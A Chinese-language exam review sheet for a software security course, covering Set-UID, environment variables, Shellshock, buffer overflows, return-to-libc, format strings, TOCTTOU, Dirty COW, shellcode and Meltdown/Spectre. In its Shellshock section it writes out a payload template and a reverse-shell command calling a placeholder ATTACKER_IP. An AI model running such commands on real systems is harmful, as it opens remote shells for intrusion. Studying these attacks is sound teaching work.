# 总复习主线

这门课可以用一句话串起来：

```text
攻击者利用程序对“输入、权限、内存、环境、CPU行为”的错误假设，
让程序执行本不该执行的操作。
```

可以分成四大类：

```text
1. 权限类：
   Linux 权限、Set-UID、sudo、capability、环境变量攻击。

2. 内存破坏类：
   Buffer Overflow、Return-to-libc、ROP、Format String、Shellcode。

3. 竞态条件类：
   TOCTTOU Race Condition、Dirty COW。

4. 侧信道和瞬态执行类：
   Meltdown、Spectre、Flush+Reload。
```

---

# H01：Meltdown / Spectre

## 核心一句话

```text
Meltdown 和 Spectre 都利用 CPU 瞬态执行留下的 cache 痕迹泄露秘密。
```

## 必背点

```text
1. cache hit 比 cache miss 快。
2. Flush+Reload 通过测量访问时间判断某个地址是否进了 cache。
3. array[secret * 4096] 用 secret 改变 cache 状态。
4. Meltdown 利用异常处理前的瞬态执行读取内核数据。
5. Spectre 利用分支预测错误绕过软件边界检查。
6. Meltdown 攻击内核/用户隔离。
7. Spectre 常攻击同一进程内的软件隔离或沙箱边界。
8. KAISER/KPTI 防御 Meltdown 的思路是不把内核内存映射到用户页表。
9. Spectre 需要训练 CPU，让分支预测器预测条件为真。
```

## 最容易考的区别

```text
Meltdown：
利用非法访问内核地址时，异常处理前的瞬态执行。

Spectre：
利用分支预测错误，让 CPU 瞬态执行本不该执行的路径。
```

## 大题模板

```text
攻击者先 flush 探测数组；
CPU 在瞬态执行中读取 secret；
用 secret 访问 array[secret * 4096]；
虽然架构状态会回滚，但 cache 状态不会完全回滚；
攻击者 reload 每个 array[i * 4096] 并测量时间；
访问最快的 i 就是 secret。
```

# S01：Linux Security Basics

## 核心一句话

```text
Linux 权限判断依赖 UID/GID 和文件权限，root 特权来自 UID 0。
```

## 必背点

```text
1. /etc/passwd 第三个字段是 UID，第四个字段是 GID。
2. root 特殊不是因为名字叫 root，而是因为 UID = 0。
3. 文件权限分 owner、group、others。
4. rwx 对应 4、2、1。
5. chmod 543 = owner r-x，group r--，others -wx。
6. 普通文件默认权限从 666 开始，目录从 777 开始。
7. umask 是屏蔽权限，不是添加权限。
8. sudo 通过 /etc/sudoers 授权普通用户执行特权命令。
9. /etc/passwd 存账户信息。
10. /etc/shadow 存密码哈希。
11. salt 用于防止相同密码产生相同 hash，并抵抗彩虹表。
12. POSIX capabilities 把 root 权限拆成更细粒度能力。
```

## 大题模板

```text
Linux 内核主要根据数字 UID 判断用户身份。
UID 0 被视为超级用户，可以绕过很多普通访问控制。
用户名 root 本身没有特殊魔法。
如果其他账户 UID 也被设为 0，它也会拥有 root 权限。
```

# S02：Set-UID Programs

## 核心一句话

```text
Set-UID 程序运行时 EUID 变成文件所有者，因此普通用户可以临时通过受限程序使用特权。
```

## 必背点

```text
1. RUID = 真正运行程序的用户。
2. EUID = 权限检查时使用的身份。
3. 文件访问控制主要看 EUID。
4. root-owned Set-UID 程序运行时 EUID = root。
5. Set-UID 安全性依赖程序代码逻辑限制。
6. chown 会清除 Set-UID 位。
7. 创建 root Set-UID 程序要先 chown root，再 chmod 4755。
8. 普通用户不能随便调试 Set-UID 程序。
9. system() 不安全，因为它调用 shell。
10. execve() 更安全，因为它直接执行程序，不经过 shell。
11. 输入重定向由 shell 在程序启动前完成，不能借 Set-UID 权限打开 /etc/shadow。
12. 降权前要关闭敏感 fd，否则可能 capability leak。
```

## `system()` vs `execve()` 必背

```text
system(command)：
实际执行 /bin/sh -c command。
会受 PATH、IFS、shell 元字符和环境变量影响。
代码和数据容易混在一起。

execve(path, argv, envp)：
直接执行指定程序。
命令路径和参数分开。
不经过 shell，因此更安全。
```

## 大题模板

```text
Set-UID 程序不是把 root 权限直接交给用户。
用户只能通过程序已经写好的逻辑使用特权。
如果程序存在漏洞，例如 system() 调用、缓冲区溢出、权限泄露、竞态条件，
攻击者就可能突破程序逻辑限制，滥用 EUID=root 的权限。
```

# S03：Environment Variables

## 核心一句话

```text
环境变量是用户可控输入，高权限程序不能盲目信任它。
```

## 必背点

```text
1. shell 变量只在当前 shell 内部有效。
2. export 后才会成为环境变量并传给子进程。
3. fork() 通常继承环境变量。
4. execve() 第三个参数决定新程序环境变量。
5. execve(..., NULL) 表示不给新程序环境变量。
6. execve(..., environ) 表示继承当前环境变量。
7. system() 会把环境变量传给 /bin/sh。
8. PATH 可以影响 shell 查找命令。
9. PWD 是用户可控的，不可信。
10. getcwd() 比 PWD 更可靠。
11. getenv() 会读取用户环境变量，特权程序慎用。
12. secure_getenv() 在安全执行场景下会返回 NULL。
13. LD_PRELOAD、LD_LIBRARY_PATH 会影响动态链接器。
14. Set-UID 程序中危险 LD_* 变量通常会被过滤。
```

## 大题模板

```text
即使程序员没有直接调用 getenv()，程序仍可能间接受环境变量影响。
例如 system() 会启动 shell，shell 使用 PATH；
动态链接器会使用 LD_PRELOAD 和 LD_LIBRARY_PATH；
库函数也可能使用 LANG、NLSPATH 等变量。
因此环境变量是特权程序的重要攻击面。
```

# W06：Shellshock

## 核心一句话

```text
Shellshock 是 Bash 从环境变量中导入函数定义时，错误执行函数定义后面命令的漏洞。
```

## 必背 payload

```bash
() { :; }; command
```

含义：

```text
() { :; }    假函数定义
command      攻击者真正想执行的命令
```

## 必背点

```text
1. Bash 支持通过环境变量传递函数定义。
2. 有漏洞 Bash 解析函数定义后，会错误执行后面的命令。
3. payload 必须以函数定义形式开头。
4. 直接把普通命令放进环境变量通常不会执行。
5. 成功利用需要两个条件：
   攻击者能控制环境变量；
   目标启动漏洞 Bash。
6. CGI 容易受攻击，因为 HTTP Header 会变成环境变量。
7. User-Agent 常变成 HTTP_USER_AGENT。
8. curl -A 可以控制 User-Agent。
9. curl -e 可以控制 Referer。
10. curl -H 可以设置自定义 Header。
11. Shellshock 执行命令的权限取决于 CGI/Web 服务器进程权限。
12. 不一定能读 /etc/shadow，因为 Web 进程通常不是 root。
```

## CGI 攻击链模板

```text
攻击者发送恶意 HTTP Header；
Apache 把 Header 转成 CGI 环境变量；
CGI 脚本由 /bin/bash_shellshock 执行；
漏洞 Bash 启动时解析环境变量；
发现值形如 () { :; }; command；
错误执行 command；
攻击者实现远程命令执行。
```

## 反向 shell 必背

```bash
/bin/bash -i > /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1
```

解释：

```text
0 = stdin
1 = stdout
2 = stderr

bash -i       启动交互式 shell
> /dev/tcp    stdout 重定向到 TCP 连接
0<&1          stdin 也来自同一个连接
2>&1          stderr 也输出到同一个连接
```

# S04：Buffer Overflow

## 核心一句话

```text
缓冲区溢出就是输入太长，写出 buffer 边界，覆盖返回地址等关键数据。
```

## 必背点

```text
1. strcpy() 不检查长度。
2. 局部变量通常在栈上。
3. 返回地址也在栈上。
4. 栈通常从高地址向低地址增长。
5. buffer 溢出可能覆盖 saved EBP 和 return address。
6. 覆盖返回地址可以改变函数返回后的执行位置。
7. shellcode 是攻击者注入的小段机器码。
8. NOP sled 用来提高跳转成功率。
9. payload 中不能提前出现 0x00，因为 strcpy() 遇到 0 会停止。
10. ASLR 随机化地址，增加猜地址难度。
11. StackGuard 用 canary 检测返回地址是否被覆盖。
12. NX 禁止执行栈上代码，但不能防 return-to-libc/ROP。
13. 堆溢出也可能通过覆盖指针实现任意地址写。
```

## payload 模板

```text
[NOP sled][shellcode][padding][new return address]
```

## offset 模板

```text
offset = 返回地址位置 - buffer 起始地址
```

32 位：

```text
返回地址占 4 字节
```

64 位：

```text
返回地址占 8 字节
```

## 大题模板

```text
攻击者构造超长输入。
前面放 NOP sled 和 shellcode。
计算 buffer 起始地址到返回地址字段的偏移。
在该偏移处写入新的返回地址。
新的返回地址指向 NOP sled 或 shellcode。
函数 return 时取出被覆盖的返回地址，跳到攻击者代码。
```

# S05：Return-to-libc / ROP

## 核心一句话

```text
当栈不可执行时，攻击者不执行自己的 shellcode，而是复用程序已有代码。
```

## Return-to-libc 必背

经典目标：

```c
system("/bin/sh");
```

栈布局：

```text
system() 地址        ← 覆盖原返回地址
exit() 地址          ← system 返回后去这里
"/bin/sh" 地址       ← system 的参数
```

## 必背点

```text
1. NX 让栈不可执行，传统 shellcode 攻击失败。
2. Return-to-libc 跳到 libc 中已有函数。
3. 常用 system("/bin/sh")。
4. 需要 system 地址、exit 地址、"/bin/sh" 地址。
5. "/bin/sh" 可以放在环境变量中。
6. Bash 可能因 RUID != EUID 而降权。
7. 可先调用 setuid(0) 再 system("/bin/sh")。
8. ASLR 会随机化 libc 地址，使攻击更难。
```

## ROP 必背

```text
ROP = Return-Oriented Programming。
攻击者把很多以 ret 结尾的小代码片段 gadget 串起来执行。
```

例如：

```text
gadget A; ret
gadget B; ret
gadget C; ret
```

栈上放：

```text
A 地址
B 地址
C 地址
```

每个 `ret` 会跳到下一个 gadget。

## 大题模板

```text
Return-to-libc 不需要执行栈上的 shellcode。
攻击者通过缓冲区溢出覆盖返回地址，使程序 return 到 system()。
然后在栈上伪造 system() 的返回地址和参数。
这样系统会执行 system("/bin/sh")。
```

# S06：Format String Vulnerability

## 核心一句话

```text
格式字符串漏洞来自 printf(user_input)，用户输入被当成格式控制字符串执行。
```

## 必背点

```text
1. 正确写法：printf("%s", input)
2. 危险写法：printf(input)
3. %x 可以读取栈上的值。
4. %s 会把栈上的值当地址读取字符串，可能崩溃。
5. %n 会把已打印字符数写入某个地址。
6. %hn 写 2 字节。
7. %hhn 写 1 字节。
8. 攻击者可以用 %n 修改返回地址。
9. 格式字符串攻击不需要连续覆盖 canary。
10. StackGuard 对格式字符串攻击效果有限。
11. NX 不能彻底防御，因为可以结合 return-to-libc。
```

## `%n` 必背

```text
%n 不打印东西。
它把当前 printf 已经打印的字符数写入对应地址。
```

例子：

```c
printf("hello%n", &x);
```

结果：

```text
x = 5
```

## 大题模板

```text
攻击者把目标地址放入输入中。
利用若干 %x 移动 printf 的参数读取位置。
然后用 %n 或 %hn 向目标地址写入指定值。
如果目标地址是返回地址字段，就可以把返回地址改成 shellcode 或 libc 函数地址。
```

## Buffer Overflow vs Format String

```text
Buffer Overflow：
靠超长输入连续覆盖内存。

Format String：
靠 printf 的 %n 直接向指定地址写。
```

# S07：Race Condition

## 核心一句话

```text
竞态条件漏洞是程序检查资源时和使用资源时不是同一瞬间，攻击者趁中间窗口把资源换掉。
```

## 必背词

```text
TOCTTOU = Time Of Check To Time Of Use
检查时间到使用时间漏洞
```

## 必背点

```text
1. access() + open() 是典型危险组合。
2. access() 检查 RUID。
3. open() 使用 EUID。
4. Set-UID 程序中 EUID 可能是 root。
5. 攻击者可以在 /tmp 中切换符号链接。
6. access() 时让 /tmp/XYZ 指向普通文件。
7. open() 前换成指向 /etc/passwd。
8. stat(filename) 通过文件名检查，容易被换。
9. fstat(fd) 检查已打开文件描述符，更安全。
10. open() 内部权限检查和打开在内核中完成，外部不能插入。
11. 文件锁不能可靠解决 TOCTTOU。
12. 最小权限原则：先降权，再 open。
```

## 典型攻击链

```text
Set-UID 程序执行 access("/tmp/XYZ")；
攻击者让 /tmp/XYZ 指向自己可写文件；
检查通过；
攻击者把 /tmp/XYZ 换成 /etc/passwd 的符号链接；
程序用 root 权限 open("/tmp/XYZ")；
实际打开 /etc/passwd；
程序写入敏感文件。
```

## stat vs fstat

```text
stat("/tmp/XYZ")：
检查文件名当前指向的对象，可能被替换。

fstat(fd)：
检查已经打开的文件对象，目标已经固定，更安全。
```

# S08：Dirty COW

## 核心一句话

```text
Dirty COW 利用 Copy-On-Write 中的竞态条件，让 MAP_PRIVATE 的写入错误影响到底层只读文件。
```

## 必背点

```text
1. mmap() 把文件映射到内存。
2. MAP_SHARED 修改可能写回文件。
3. MAP_PRIVATE 修改只应影响私有副本。
4. COW = Copy-On-Write，写时复制。
5. fork() 后父子进程先共享物理页，写入时才复制。
6. madvise(MADV_DONTNEED) 可以丢弃私有副本。
7. Dirty COW 让 write() 和 madvise() 竞争。
8. 本应写私有副本，结果写到原始文件页。
9. 可修改 /etc/passwd、/etc/shadow、/etc/sudoers 等敏感文件。
10. Dirty COW 是内核级竞态条件。
```

## MAP_PRIVATE 正常流程

```text
程序写映射页；
内核发现是 MAP_PRIVATE；
复制一份私有页面；
页表指向私有副本；
写入发生在私有副本；
原文件不变。
```

## Dirty COW 攻击流程

```text
线程 1：不停 write() 映射内存。
线程 2：不停 madvise(MADV_DONTNEED) 丢弃私有副本。
如果时机刚好，write() 最终写到原始文件页。
```

## 大题模板

```text
Dirty COW 的关键不是普通用户有写权限，
而是利用内核 COW 实现中的竞态条件。
MAP_PRIVATE 本来保证修改不影响原文件，
但 write() 和 madvise() 的竞争可能破坏这个保证，
导致只读文件被非法修改。
```

# S09：Shellcode

## 核心一句话

```text
Shellcode 是一小段机器码，用来直接触发系统调用，例如 execve("/bin/sh", argv, 0)。
```

## 32-bit Linux execve 必背

```text
eax = 0x0b               execve 系统调用号
ebx = "/bin/sh" 地址     第一个参数 filename
ecx = argv[] 地址        第二个参数 argv
edx = 0                  第三个参数 envp
```

## argv 必背

```text
argv[0] = "/bin/sh" 地址
argv[1] = 0
```

## 为什么 shellcode 不能有 0？

```text
很多漏洞用 strcpy() 复制 shellcode。
strcpy() 遇到 0x00 会停止。
所以 shellcode 中不能提前出现 binary zero。
```

## 去 0 方法

```text
1. xor eax, eax 生成 0。
2. 用占位符，例如 /bin/shX，运行时把 X 改成 0。
3. 用移位、加减、or 等操作运行时构造含 0 的值。
```

## jmp-call-pop

作用：

```text
动态获得字符串地址，不硬编码绝对地址。
```

模板：

```asm
jmp two

one:
    pop ebx

two:
    call one
    db "/bin/sh"
```

解释：

```text
call 会把下一条指令地址压栈；
下一条指令地址正好是字符串地址；
pop ebx 得到字符串地址。
```

# 三个实验总复习

## 实验 1：Set-UID + 环境变量

```text
核心：用户环境变量如何影响高权限程序。
```

必背：

```text
1. fork() 继承环境变量。
2. execve() 第三个参数决定环境变量。
3. system() 会调用 shell，受 PATH 影响。
4. execve() 不经过 shell，更安全。
5. LD_PRELOAD 对普通程序有效，对 Set-UID 通常被过滤。
6. 降权前打开的敏感 fd 会造成权限泄露。
```

---

## 实验 2：Shellshock

```text
核心：HTTP Header → CGI 环境变量 → 漏洞 Bash → 命令执行。
```

必背：

```text
1. payload = () { :; }; command
2. curl -A 设置 User-Agent。
3. curl -e 设置 Referer。
4. curl -H 设置自定义 Header。
5. CGI 会把 HTTP Header 变成环境变量。
6. /etc/passwd 通常可读，/etc/shadow 通常不可读。
7. 反向 shell 绑定 bash 的 stdin/stdout/stderr 到 TCP。
```

---

## 实验 3：Buffer Overflow Server

```text
核心：远程输入通过 TCP 进入服务器，触发 strcpy() 栈溢出，覆盖返回地址。
```

必背：

```text
1. stack.c 中 strcpy(buffer, str) 是漏洞。
2. badfile 是攻击 payload。
3. exploit.py 里 start、ret、offset 最关键。
4. Level 1 给 buffer 和 frame pointer，可以直接算 offset。
5. Level 2 不给 frame pointer，要重复填 ret 覆盖可能范围。
6. 64 位地址含 0，strcpy() 会提前停止，所以更难。
7. ASLR 随机地址。
8. StackGuard 检测 canary。
9. NX 禁止执行栈上 shellcode。
```

# 最重要的横向比较

## `system()` vs `execve()`

```text
system():
调用 shell。
受 PATH、环境变量、shell 元字符影响。
危险。

execve():
直接执行指定程序。
参数数组传递。
不经过 shell。
更安全。
```

---

## Buffer Overflow vs Format String

```text
Buffer Overflow:
输入太长，连续覆盖内存，最终覆盖返回地址。

Format String:
输入被 printf 当格式字符串，用 %n 直接写目标地址。
```

---

## Meltdown vs Spectre

```text
Meltdown:
利用异常前瞬态执行，突破用户/内核隔离。

Spectre:
利用分支预测错误，突破软件边界检查。
```

---

## Race Condition vs Dirty COW

```text
Race Condition:
用户态程序 access() 和 open() 之间文件被替换。

Dirty COW:
内核 COW 机制中 write() 和 madvise() 竞争，导致只读文件被改。
```

---

## StackGuard vs NX vs ASLR

```text
StackGuard:
检测栈溢出是否破坏 canary。

NX:
禁止执行栈上的 shellcode。

ASLR:
随机化地址，让攻击者难以猜中跳转目标。
```

# 最可能考的大题模板合集

## 1. 为什么 `system()` 不适合 Set-UID 程序？

```text
system() 会调用 /bin/sh -c command。
shell 会解释命令字符串，并受 PATH 等环境变量影响。
攻击者可以控制 PATH 或插入 shell 元字符，让 Set-UID 程序执行攻击者命令。
因此特权程序应避免 system()，使用 execve() 并指定绝对路径。
```

---

## 2. Shellshock 攻击如何发生？

```text
攻击者构造环境变量值：() { :; }; command。
在 CGI 场景中，HTTP Header 会被 Apache 转换成环境变量。
CGI 脚本由漏洞 Bash 执行。
Bash 启动时解析环境变量，把函数定义导入。
旧版 Bash 错误执行函数定义后面的 command。
因此攻击者实现远程命令执行。
```

---

## 3. 缓冲区溢出攻击如何构造？

```text
找到 buffer 地址和返回地址偏移。
构造输入，前面放 NOP sled 和 shellcode。
在返回地址偏移处写入新的返回地址。
新的返回地址指向 NOP sled 或 shellcode。
函数 return 时跳到攻击者代码。
```

---

## 4. Return-to-libc 如何绕过 NX？

```text
NX 禁止执行栈上 shellcode。
Return-to-libc 不执行栈上代码，而是跳到 libc 中已有函数。
攻击者把返回地址改成 system() 地址。
在栈上布置 exit() 地址和 "/bin/sh" 地址。
函数 return 后执行 system("/bin/sh")。
```

---

## 5. 格式字符串漏洞如何修改返回地址？

```text
程序错误使用 printf(user_input)。
攻击者在输入中放入目标地址和格式控制符。
利用 %x 移动参数指针。
利用 %n 或 %hn 向目标地址写入已打印字符数。
如果目标地址是返回地址位置，就可以改变控制流。
```

---

## 6. Race Condition 如何利用？

```text
Set-UID 程序先 access("/tmp/XYZ") 检查权限。
攻击者让 /tmp/XYZ 此时指向自己可写文件。
检查通过后，在 open() 前把 /tmp/XYZ 换成指向 /etc/passwd 的符号链接。
open() 使用 EUID=root 打开 /etc/passwd。
程序写入敏感文件。
```

---

## 7. Dirty COW 如何利用？

```text
MAP_PRIVATE 映射本应写入私有副本，不应修改原文件。
攻击者启动两个线程：
一个不停 write()；
一个不停 madvise(MADV_DONTNEED)。
madvise() 丢弃私有副本，使页表状态发生竞争。
如果时机刚好，write() 会写到原始文件页。
于是普通用户可能修改只读敏感文件。
```

---

## 8. Meltdown/Spectre 如何通过 cache 泄露数据？

```text
攻击者先清空探测数组 cache。
CPU 在瞬态执行中读取 secret。
用 secret 访问 array[secret * 4096]。
该位置进入 cache。
虽然错误执行路径被回滚，但 cache 状态保留。
攻击者重新加载 array[i * 4096] 并测量时间。
访问最快的 i 就是 secret。
```

# 考前最后速记

```text
H01:
Meltdown/Spectre = 瞬态执行 + cache 侧信道。

S01:
root 特权来自 UID 0，不是名字 root。

S02:
Set-UID 权限看 EUID，安全靠程序逻辑限制。

S03:
环境变量是用户可控输入，特权程序不能信。

W06:
Shellshock = 环境变量中的 Bash 函数定义导致命令执行。

S04:
Buffer Overflow = 超长输入覆盖返回地址。

S05:
Return-to-libc/ROP = 不执行栈上代码，复用已有代码。

S06:
Format String = printf(user_input) 让用户用 %n 写内存。

S07:
Race Condition = check 和 use 之间资源被换掉。

S08:
Dirty COW = write 和 madvise 竞争，MAP_PRIVATE 写到原文件。

S09:
Shellcode = 准备寄存器，调用 execve("/bin/sh", argv, 0)。
```

# 最后压缩成 10 句话

```text
1. Linux 用 UID/GID 和 rwx 权限做访问控制。
2. root 的本质是 UID 0。
3. Set-UID 程序运行时 EUID 变成文件所有者。
4. 环境变量是用户可控的，高权限程序不能信。
5. system() 会调用 shell，所以比 execve() 危险。
6. Shellshock 利用 Bash 解析环境变量函数定义的漏洞执行命令。
7. Buffer overflow 通过超长输入覆盖返回地址。
8. Return-to-libc/ROP 通过复用已有代码绕过 NX。
9. Format string 通过 %n 直接写内存。
10. Race、Dirty COW、Meltdown、Spectre 都是在利用“程序或 CPU 以为安全，但中间状态被攻击者利用”。
```
